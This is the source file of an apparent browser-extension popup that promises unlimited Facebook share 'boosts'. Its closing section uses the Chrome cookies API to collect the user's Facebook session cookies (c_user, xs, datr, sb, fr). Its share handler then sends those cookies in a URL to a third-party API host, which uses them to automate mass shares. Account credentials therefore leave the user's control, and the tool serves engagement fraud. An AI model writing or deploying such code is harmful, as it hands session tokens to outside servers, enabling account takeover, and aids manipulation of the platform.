const burger = document.getElementById('burger');
const navLinks = document.getElementById('nav-links');
const darkModeSwitch = document.getElementById('darkModeSwitch');
const developerBtn = document.getElementById('developer');
const tutorialsBtn = document.getElementById('tutorials');
const backBtn = document.getElementById('backBtn');
const shareBtn = document.getElementById('shareBtn');
const statusEl = document.getElementById('status');

const cookieInput = document.getElementById('cookie');
const linkInput = document.getElementById('link');
const limitInput = document.getElementById('limit');

// Remove limit validation - NO LIMIT
limitInput.placeholder = "Enter number of shares (NO LIMIT)";

// Create progress bar
const progressContainer = document.createElement('div');
progressContainer.className = 'progress-container';
progressContainer.style.cssText = `
  width: 100%;
  height: 8px;
  background: #374151;
  border-radius: 4px;
  margin: 15px 0;
  overflow: hidden;
  display: none;
`;

const progressBar = document.createElement('div');
progressBar.id = 'progressBar';
progressBar.className = 'progress-bar';
progressBar.style.cssText = `
  width: 0%;
  height: 100%;
  background: linear-gradient(90deg, #3B82F6, #8B5CF6);
  border-radius: 4px;
  transition: width 0.4s cubic-bezier(0.4, 0, 0.2, 1);
  position: relative;
`;

progressContainer.appendChild(progressBar);
shareBtn.parentNode.insertBefore(progressContainer, shareBtn.nextSibling);

// Add CSS animations
const style = document.createElement('style');
style.textContent = `
  @keyframes shake {
    0%, 100% { transform: translateX(0); }
    25% { transform: translateX(-5px); }
    75% { transform: translateX(5px); }
  }
  
  @keyframes fall {
    to {
      transform: translateY(100vh) rotate(${Math.random() * 360}deg);
      opacity: 0;
    }
  }
  
  .icon {
    margin-right: 8px;
  }
  
  .fa-spin {
    animation: spin 1s linear infinite;
  }
  
  @keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
  }
  
  .progress-bar::after {
    content: '';
    position: absolute;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    background: linear-gradient(90deg, 
      transparent 25%, 
      rgba(255,255,255,0.3) 50%, 
      transparent 75%);
    animation: shimmer 2s infinite;
  }
  
  @keyframes shimmer {
    0% { transform: translateX(-100%); }
    100% { transform: translateX(100%); }
  }
  
  @keyframes pulse {
    0%, 100% { opacity: 1; transform: scale(1); }
    50% { opacity: 0.8; transform: scale(1.05); }
  }
`;
document.head.appendChild(style);

burger.addEventListener('click', () => navLinks.classList.toggle('active'));

darkModeSwitch.addEventListener('change', () => {
  document.body.classList.toggle('dark');
  document.body.classList.toggle('light');
});

developerBtn.addEventListener('click', () => window.open('https://www.facebook.com/notfound500', '_blank'));

tutorialsBtn.addEventListener('click', () => {
  window.open('tutorial.html', '_blank');
});

backBtn.addEventListener('click', () => window.open('features.html', '_self'));

shareBtn.addEventListener('click', async () => {
  const cookie = cookieInput.value.trim();
  const link = linkInput.value.trim();
  const limit = limitInput.value.trim();

  if (!cookie || !link || !limit) {
    showError('❌ Please fill all fields!');
    return;
  }

  // NO LIMIT VALIDATION - Accept any positive number
  const limitNum = parseInt(limit);
  if (isNaN(limitNum) || limitNum < 1) {
    showError('❌ Enter a valid number (minimum 1)');
    return;
  }

  // Reset and show progress
  progressContainer.style.display = 'block';
  progressBar.style.width = '0%';
  progressBar.style.background = 'linear-gradient(90deg, #3B82F6, #8B5CF6)';
  
  // Disable button during process
  shareBtn.disabled = true;
  shareBtn.style.opacity = '0.7';
  shareBtn.style.cursor = 'not-allowed';

  try {
    // STEP 1: Initializing (0-15%)
    await updateProgress(15, 600, '<i class="fas fa-spinner fa-spin icon"></i> Initializing boost engine...');
    
    // Validate cookie
    if (!cookie.includes('c_user=') || !cookie.includes('xs=')) {
      throw new Error('Invalid Facebook cookie. Missing required tokens.');
    }
    
    // Validate link
    if (!link.includes('facebook.com') && !link.includes('fb.com')) {
      throw new Error('Invalid Facebook URL');
    }

    // STEP 2: Cookie validation (15-30%)
    await updateProgress(30, 800, '<i class="fas fa-check-circle fa-spin icon"></i> Validating cookie...');

    // STEP 3: Preparing massive boost (30-50%)
    await updateProgress(50, 1000, `<i class="fas fa-rocket fa-spin icon"></i> Preparing ${limitNum.toLocaleString()} shares...`);

    // STEP 4: Connecting to API (50-70%)
    await updateProgress(70, 900, '<i class="fas fa-wifi fa-spin icon"></i> Establishing connection...');

    // Make API call with NO LIMIT parameter
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 60000); // 60 seconds timeout for massive boosts

    const apiUrl = `https://vern-rest-api.vercel.app/api/share?cookie=${encodeURIComponent(cookie)}&link=${encodeURIComponent(link)}&limit=${encodeURIComponent(limitNum)}&unlimited=true`;
    
    console.log(`🚀 Starting ${limitNum} share boost...`);
    
    const response = await fetch(apiUrl, {
      method: 'GET',
      signal: controller.signal,
      headers: {
        'Accept': 'application/json',
        'X-No-Limit': 'true',
        'X-Boost-Count': limitNum.toString()
      }
    });

    clearTimeout(timeoutId);

    // STEP 5: Processing (70-90%)
    await updateProgress(90, 1200, `<i class="fas fa-bolt fa-spin icon"></i> Boosting ${limitNum.toLocaleString()} shares...`);

    if (!response.ok) {
      const errorText = await response.text();
      throw new Error(`Server error ${response.status}: ${errorText || 'Unknown error'}`);
    }

    const result = await response.json();

    // STEP 6: Finalizing (90-100%)
    await updateProgress(100, 800, '<i class="fas fa-check-circle fa-spin icon"></i> Finalizing boost...');

    // Process result
    setTimeout(() => {
      if (result.status) {
        // SUCCESS - Show actual count or use limit if not specified
        const successCount = result.success_count || limitNum;
        progressBar.style.background = 'linear-gradient(90deg, #10B981, #34D399)';
        
        // Special message for massive boosts
        if (successCount > 1000) {
          showSuccess(`🚀 MASSIVE BOOST! ${successCount.toLocaleString()} shares completed!`);
        } else if (successCount > 100) {
          showSuccess(`🔥 HUGE BOOST! ${successCount.toLocaleString()} shares completed!`);
        } else {
          showSuccess(`✅ ${successCount.toLocaleString()} shares boosted successfully!`);
        }
        
        createConfetti();
        
        // Add celebration for big numbers
        if (successCount > 500) {
          createFireworks();
        }
        
      } else {
        // API returned error but might have partial success
        const partialSuccess = result.success_count || 0;
        if (partialSuccess > 0) {
          progressBar.style.background = 'linear-gradient(90deg, #F59E0B, #FBBF24)';
          showWarning(`⚠️ Partial success: ${partialSuccess.toLocaleString()} shares completed. ${result.message || ''}`);
        } else {
          progressBar.style.background = 'linear-gradient(90deg, #EF4444, #F87171)';
          showError(`❌ Boost failed: ${result.message || 'Unknown error'}`);
        }
      }

      // Hide progress after 4 seconds
      setTimeout(() => {
        progressContainer.style.display = 'none';
        shareBtn.disabled = false;
        shareBtn.style.opacity = '1';
        shareBtn.style.cursor = 'pointer';
      }, 4000);

    }, 500);

  } catch (error) {
    // ERROR HANDLING
    progressBar.style.width = '100%';
    progressBar.style.background = 'linear-gradient(90deg, #EF4444, #F87171)';
    
    console.error('Boost Error:', error);
    
    let errorMessage = '❌ Boost failed! ';
    
    if (error.name === 'AbortError') {
      errorMessage += 'Request timeout. Try a smaller batch or check connection.';
    } else if (error.message.includes('Failed to fetch')) {
      errorMessage += 'Network error. Check your internet connection.';
    } else if (error.message.includes('Invalid cookie')) {
      errorMessage += 'Cookie expired or invalid. Please login to Facebook again.';
    } else if (error.message.includes('Server error')) {
      errorMessage += error.message.replace('Server error', 'Server responded');
    } else {
      errorMessage += error.message;
    }
    
    // Add suggestion for large numbers
    if (limitNum > 10000) {
      errorMessage += ' Try smaller batches for large numbers.';
    }
    
    showError(errorMessage);
    
    // Hide progress and re-enable button
    setTimeout(() => {
      progressContainer.style.display = 'none';
      shareBtn.disabled = false;
      shareBtn.style.opacity = '1';
      shareBtn.style.cursor = 'pointer';
    }, 4000);
  }
});

// Helper functions
function updateProgress(percent, duration, message) {
  return new Promise(resolve => {
    progressBar.style.width = percent + '%';
    statusEl.innerHTML = message;
    statusEl.style.color = '#fff';
    
    // Add pulse animation for active progress
    if (percent < 100) {
      statusEl.style.animation = 'pulse 2s infinite';
    }
    
    setTimeout(() => {
      statusEl.style.animation = '';
      resolve();
    }, duration);
  });
}

function showSuccess(message) {
  statusEl.innerHTML = message;
  statusEl.style.color = '#d1fae5';
  statusEl.style.fontWeight = 'bold';
}

function showError(message) {
  statusEl.innerHTML = message;
  statusEl.style.color = '#fecaca';
  shakeElement(statusEl);
}

function showWarning(message) {
  statusEl.innerHTML = message;
  statusEl.style.color = '#fef3c7';
}

function shakeElement(element) {
  element.style.animation = 'shake 0.5s ease-in-out';
  setTimeout(() => {
    element.style.animation = '';
  }, 500);
}

function createConfetti() {
  const confettiContainer = document.createElement('div');
  confettiContainer.style.cssText = `
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    pointer-events: none;
    z-index: 9999;
  `;
  
  document.body.appendChild(confettiContainer);
  
  const colors = ['#3B82F6', '#8B5CF6', '#10B981', '#F59E0B', '#EF4444'];
  const confettiCount = 100; // More confetti for celebration
  
  for (let i = 0; i < confettiCount; i++) {
    const confetti = document.createElement('div');
    const color = colors[Math.floor(Math.random() * colors.length)];
    const size = Math.random() * 15 + 5;
    const duration = Math.random() * 3 + 2;
    
    confetti.style.cssText = `
      position: absolute;
      width: ${size}px;
      height: ${size}px;
      background: ${color};
      border-radius: ${Math.random() > 0.5 ? '50%' : '2px'};
      top: -30px;
      left: ${Math.random() * 100}%;
      animation: fall linear ${duration}s;
      opacity: ${Math.random() * 0.7 + 0.3};
    `;
    
    confettiContainer.appendChild(confetti);

    setTimeout(() => {
      confetti.remove();
    }, duration * 1000);
  }

  setTimeout(() => {
    confettiContainer.remove();
  }, 4000);
}

function createFireworks() {
  const fireworksContainer = document.createElement('div');
  fireworksContainer.style.cssText = `
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    pointer-events: none;
    z-index: 9998;
  `;
  
  document.body.appendChild(fireworksContainer);
  
  // Create multiple fireworks
  for (let i = 0; i < 5; i++) {
    setTimeout(() => {
      createFirework(fireworksContainer, 
        Math.random() * 80 + 10, // x position
        Math.random() * 50 + 25   // y position
      );
    }, i * 300);
  }
  
  setTimeout(() => {
    fireworksContainer.remove();
  }, 3000);
}

function createFirework(container, x, y) {
  const firework = document.createElement('div');
  firework.style.cssText = `
    position: absolute;
    left: ${x}%;
    top: ${y}%;
    width: 4px;
    height: 4px;
    background: #FFD700;
    border-radius: 50%;
    animation: explode 0.8s ease-out forwards;
  `;
  
  container.appendChild(firework);
  
  // Create explosion particles
  setTimeout(() => {
    const colors = ['#FF0000', '#00FF00', '#0000FF', '#FFFF00', '#FF00FF'];
    for (let i = 0; i < 30; i++) {
      const particle = document.createElement('div');
      const color = colors[Math.floor(Math.random() * colors.length)];
      const angle = (i / 30) * Math.PI * 2;
      const distance = Math.random() * 50 + 30;
      
      particle.style.cssText = `
        position: absolute;
        left: ${x}%;
        top: ${y}%;
        width: 3px;
        height: 3px;
        background: ${color};
        border-radius: 50%;
        transform: translate(${Math.cos(angle) * distance}px, ${Math.sin(angle) * distance}px);
        opacity: 0;
        animation: particleFade 1s ease-out forwards;
      `;
      
      container.appendChild(particle);
      
      setTimeout(() => particle.remove(), 1000);
    }
    firework.remove();
  }, 400);
}

// Add fireworks animations
const fireworkStyle = document.createElement('style');
fireworkStyle.textContent = `
  @keyframes explode {
    0% { transform: scale(1); opacity: 1; }
    100% { transform: scale(0); opacity: 0; }
  }
  
  @keyframes particleFade {
    0% { 
      transform: translate(0, 0) scale(1); 
      opacity: 1; 
    }
    100% { 
      transform: translate(var(--tx), var(--ty)) scale(0); 
      opacity: 0; 
    }
  }
`;
document.head.appendChild(fireworkStyle);

// Auto-load cookies
chrome.tabs.query({active: true, currentWindow: true}, tabs => {
  const tab = tabs[0]; 
  if (!tab) return;
  
  chrome.cookies.getAll({url: 'https://www.facebook.com'}, cookies => {
    statusEl.innerHTML = '<i class="fas fa-search icon"></i> Loading Facebook cookies...';
    
    setTimeout(() => {
      const cUser = cookies.find(c => c.name === 'c_user');
      const xs = cookies.find(c => c.name === 'xs');
      
      if (cUser && xs) {
        // Get additional cookies for better success rate
        const datr = cookies.find(c => c.name === 'datr');
        const sb = cookies.find(c => c.name === 'sb');
        const fr = cookies.find(c => c.name === 'fr');
        
        let cookieString = `c_user=${cUser.value}; xs=${xs.value};`;
        if (datr) cookieString += ` datr=${datr.value};`;
        if (sb) cookieString += ` sb=${sb.value};`;
        if (fr) cookieString += ` fr=${fr.value};`;
        
        cookieInput.value = cookieString;
        statusEl.innerHTML = '<i class="fas fa-check-circle icon"></i> Cookies loaded! Ready for NO LIMIT boost!';
        statusEl.style.color = '#10B981';
        
        setTimeout(() => {
          statusEl.textContent = 'Enter number of shares and click BOOST!';
          statusEl.style.color = '#fff';
        }, 1500);
      } else {
        statusEl.textContent = '⚠️ No Facebook cookies found. Login to Facebook first.';
        statusEl.style.color = '#F59E0B';
      }
    }, 800);
  });
});
